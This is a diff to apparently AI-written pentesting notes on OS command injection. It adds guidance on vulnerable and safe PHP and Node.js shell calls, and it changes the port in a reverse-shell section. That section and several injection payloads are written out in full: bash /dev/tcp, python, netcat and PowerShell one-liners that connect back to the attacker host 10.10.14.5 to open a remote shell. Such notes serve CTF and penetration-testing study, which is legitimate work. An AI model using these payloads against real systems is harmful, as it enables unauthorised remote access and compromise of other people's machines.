@@ -22,7 +22,7 @@ When you can read the code (via LFI, a repo, a leaked `app.py`), the red flag is
 width = str(params.get('width'))          # attacker-controlled
 command = f"convert {infile} -crop {width}x{height} {outfile}"
 subprocess.run(command, capture_output=True, shell=True, check=True)   # shell parses ; | $() ` etc.
-#   payload:  width = "100  ; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' #"
+#   payload:  width = "100  ; bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1' #"
 
 # ✅ SAFE — no shell, args passed as a LIST (shell=False is the default)
 subprocess.run(["convert", infile, "-crop", crop_arg, outfile])
@@ -53,6 +53,47 @@ mv /tmp/temp.crt "/home/bill/Certs/$commonName.crt"
 > [!tip] **Order of operations — it fires even if the outer command fails.** Bash expands the entire line (command substitution included) in **phase 1**, then `execve`s the result in phase 2. So `$(...)` runs during expansion regardless of whether `mv` then succeeds — a `cp`/`chmod` payload yields empty stdout, the destination collapses to `.../.crt` (a dotfile `rm -r .../*` won't match), and a stray `.crt` is the fingerprint that the injection fired. Same root cause as the LFI decode-order gap ([[File Inclusion]] → *Decode-order / parser differential*): **data validated/built in one representation, then interpreted in another.**
 
 Delivery is often through a **structured format** whose own escaping is a *separate* quoting layer — e.g. an OpenSSL cert Common Name, where `/ + = ,` are DN-structural and need `\`-escaping *before* the payload survives to the shell. That specific delivery (near-expiry cert to trigger a renewal cron, DN-escaping, the SUID-shell gotchas) lives in [[Tools/Web/openssl|openssl]] → *Abusing a cert-renewal script*; the privesc framing is in [[Linux Priv Esc]] → *Privileged process, attacker-controlled input*.
+
+### PHP & Node.js sinks — and the escaping that doesn't save you
+
+The table above lists the dangerous functions; the exploitable shape is the same as Python's — **a shell string built from request data** — but each language ships "sanitizers" that pentesters routinely find applied *wrongly*. Knowing what each one does (and doesn't) tells you whether a sink that *looks* defended is still live.
+
+```php
+// 🚩 VULNERABLE — every one of these hands the string to /bin/sh -c
+system("ping -c 4 " . $_GET['host']);          // ; | && $() ` all fire
+$out = shell_exec("nslookup " . $_GET['host']); // passthru / exec / popen / proc_open — same
+$out = `nslookup {$_GET['host']}`;              // backticks == shell_exec
+
+// ⚠ escapeshellcmd() — escapes ; | & $ ` etc. but NOT argument injection
+system("ping -c 4 " . escapeshellcmd($_GET['host']));
+//   host = "-f 10.10.10.10"  → injects a flag (flood ping); no separator needed.
+//   escapeshellcmd neutralises COMMAND CHAINING, not attacker-controlled OPTIONS.
+
+// ✅ escapeshellarg() — wraps the value in '...' as ONE argv element
+system("ping -c 4 " . escapeshellarg($_GET['host']));
+//   safe for a single argument — but only if it's actually used as one and not
+//   concatenated with another escaped value or placed where an option is expected.
+```
+
+> [!warning] **`escapeshellcmd` ≠ `escapeshellarg`.** `escapeshellcmd` escapes shell *metacharacters* across a whole command, so it stops `;`/`|`/`$()` chaining — but it leaves `-`, spaces and `=` untouched, so **argument injection still works** (inject `-o`, `-f`, `--use-askpass`, a `file://` arg — see the Argument Injection section for what each binary gives you). `escapeshellarg` quotes a single argument and is the correct control; a codebase that reaches for `escapeshellcmd` is usually still exploitable via flags.
+
+**Legacy PHP RCE without a shell function at all** — `preg_replace` with the `/e` modifier ran the replacement string as PHP code (removed in PHP 7.0, still seen on old CTF targets):
+
+```php
+preg_replace('/(.*)/e', 'strtoupper("\1")', $_GET['q']);   // 🚩 q = {${system($_GET[c])}} → RCE
+```
+
+```javascript
+// 🚩 VULNERABLE — child_process.exec() runs its whole string in /bin/sh -c
+const { exec } = require('child_process');
+exec(`nslookup ${req.query.host}`, (e, out) => res.send(out));   // ; | && $() fire
+
+// ✅ execFile / spawn take (file, argsArray) and DON'T spawn a shell — metachars are inert
+const { execFile } = require('child_process');
+execFile('nslookup', [req.query.host], (e, out) => res.send(out));
+```
+
+> [!warning] **Node's shell can sneak back in.** `spawn`/`execFile` are safe *until* someone passes `{ shell: true }` in the options — that re-enables `/bin/sh -c` and the args are re-parsed as shell, making the "safe" call injectable again. Grep for `child_process` **and** `shell: true`. (The command-*name* argument is never escaped either — `execFile(req.query.bin, ...)` is a separate RCE even without `shell:true`.)
 
 ---
 
@@ -357,39 +398,39 @@ powershell -EncodedCommand dwBoAG8AYQBtAGkA
 Once injection is confirmed, upgrade to a full reverse shell. Set up listener first:
 
 ```bash
-nc -lvnp 4444
+nc -lvnp 9001
 ```
 
 ### Linux reverse shells
 
 ```bash
 # bash
-bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+bash -i >& /dev/tcp/10.10.14.5/9001 0>&1
 
 # URL-encoded version (for injection in URL params)
-bash%20-i%20>%26%20/dev/tcp/10.10.14.5/4444%200>%261
+bash%20-i%20>%26%20/dev/tcp/10.10.14.5/9001%200>%261
 
 # via /dev/tcp without bash -i
-0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196
+0<&196;exec 196<>/dev/tcp/10.10.14.5/9001; sh <&196 >&196 2>&196
 
 # python
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
 # nc (if -e available)
-nc -e /bin/sh 10.10.14.5 4444
+nc -e /bin/sh 10.10.14.5 9001
 
 # nc (without -e)
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 9001 >/tmp/f
 ```
 
 ### Windows reverse shells
 
 ```powershell
 # PowerShell one-liner
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',9001);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 
 # cmd through nc
-nc.exe -e cmd.exe 10.10.14.5 4444
+nc.exe -e cmd.exe 10.10.14.5 9001
 ```
 
 ---
@@ -670,5 +711,5 @@ $()
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-08-20*
-*Model: claude-opus-5*
+*Updated: 2026-09-18*
+*Model: claude-opus-4-8*
